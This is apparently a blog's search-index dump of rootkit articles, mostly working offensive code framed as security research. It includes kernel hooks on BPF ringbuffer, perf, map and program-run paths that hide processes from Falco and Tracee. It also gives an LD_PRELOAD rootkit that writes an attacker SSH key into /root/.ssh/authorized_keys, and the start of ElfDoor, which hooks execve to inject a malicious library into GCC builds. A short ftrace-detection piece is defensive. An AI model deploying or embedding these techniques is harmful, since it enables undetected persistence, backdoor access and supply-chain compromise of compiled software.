orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear \u0026ldquo;not found\u0026rdquo; without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)\nBottom line: once the kernel is attacker-controlled, the system\u0026rsquo;s \u0026ldquo;ground truth\u0026rdquo; is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can\u0026rsquo;t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) 